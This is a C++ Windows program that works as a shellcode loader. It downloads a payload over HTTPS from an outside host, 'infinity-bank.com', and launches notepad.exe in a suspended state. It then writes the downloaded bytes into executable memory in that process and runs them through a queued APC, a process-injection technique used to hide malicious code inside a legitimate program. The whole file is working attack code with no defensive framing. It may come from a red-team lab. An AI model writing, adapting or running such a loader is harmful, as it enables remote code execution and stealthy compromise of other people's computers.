#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#include <conio.h>
#include <vector>

#pragma comment(lib, "winhttp.lib")

// Initialize Download Function, takes a base address and file and returns a BYTE vector.
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

int main()
{
    // Download Shellcode
    std::vector<BYTE> shellcode = Download(L"infinity-bank.com", L"/b\0");

    if (shellcode.empty()) {
        std::cerr << "[x] Failed to download shellcode." << std::endl;
        return 1;
    }

    // Initialize startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // Initialize process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // Create terminated command line that determines what exe to execute
    wchar_t cmd[] = L"notepad.exe\0";

    // Create a process
    if (!CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info)) {
        std::cerr << "[x] Failed to create process. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Allocate memory
    LPVOID ptr = VirtualAllocEx(
        process_info->hProcess,
        NULL,
        shellcode.size(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (ptr == NULL) {
        std::cerr << "[x] Failed to allocate memory in the remote process. Error: " << GetLastError() << std::endl;
        TerminateProcess(process_info->hProcess, 1);
        CloseHandle(process_info->hThread);
        CloseHandle(process_info->hProcess);
        return 1;
    }

    // Copy shellcode
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(
        process_info->hProcess,
        ptr,
        &shellcode[0],
        shellcode.size(),
        &bytesWritten) || bytesWritten != shellcode.size()) {
        std::cerr << "[x] Failed to write shellcode to the remote process. Error: " << GetLastError() << std::endl;
        TerminateProcess(process_info->hProcess, 1);
        CloseHandle(process_info->hThread);
        CloseHandle(process_info->hProcess);
        return 1;
    }

    // Queue APC to execute shellcode
    if (QueueUserAPC((PAPCFUNC)ptr, process_info->hThread, 0) == 0) {
        std::cerr << "[x] Failed to queue APC. Error: " << GetLastError() << std::endl;
        TerminateProcess(process_info->hProcess, 1);
        CloseHandle(process_info->hThread);
        CloseHandle(process_info->hProcess);
        return 1;
    }

    // Resume Process
    if (ResumeThread(process_info->hThread) == (DWORD)-1) {
        std::cerr << "[x] Failed to resume thread. Error: " << GetLastError() << std::endl;
        TerminateProcess(process_info->hProcess, 1);
        CloseHandle(process_info->hThread);
        CloseHandle(process_info->hProcess);
        return 1;
    }

    // Close handles
    CloseHandle(process_info->hThread);
    CloseHandle(process_info->hProcess);

    std::cout << "[+] Shellcode executed successfully." << std::endl;
    return 0;
}

// Configure function to use the winhttp library
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename)
{
    // Initialize HTTP Session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);

    if (hSession == NULL) {
        std::cerr << "[x] WinHttpOpen failed. Error: " << GetLastError() << std::endl;
        return std::vector<BYTE>();
    }

    // Create an HTTP Session
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    if (hConnect == NULL) {
        std::cerr << "[x] WinHttpConnect failed. Error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    // Create the GET request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    if (hRequest == NULL) {
        std::cerr << "[x] WinHttpOpenRequest failed. Error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    // Send GET request
    if (!WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0)) {
        std::cerr << "[x] WinHttpSendRequest failed. Error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    // Receive Response
    if (!WinHttpReceiveResponse(
        hRequest,
        NULL)) {
        std::cerr << "[x] WinHttpReceiveResponse failed. Error: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return std::vector<BYTE>();
    }

    // Read shellcode data from HTTP response
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        if (!WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead)) {
            std::cerr << "[x] WinHttpReadData failed. Error: " << GetLastError() << std::endl;
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return std::vector<BYTE>();
        }

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);

    // Close all handles for HTTP requests
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
